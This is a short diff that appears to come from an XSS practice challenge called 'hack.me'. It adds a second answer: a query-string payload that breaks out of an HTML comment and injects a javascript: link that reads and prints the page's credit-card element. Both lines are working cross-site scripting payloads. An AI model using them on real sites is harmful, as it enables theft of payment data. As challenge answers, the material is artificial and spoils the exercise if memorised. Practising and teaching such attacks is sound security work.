@@ -1,1 +1,5 @@
 ?creditcard=4564654654&id=--><a href=javascript:alert(document.getElementById('creditcard').innerHTML);>Buy</a><!--
+
+ANS2 : creditcard=6547868735467356&id=--><a href=javascript:document.write(document.getElementById('creditcard').innerHTML)>print_creditcard_no</a><!--
+
+challange : hack.me
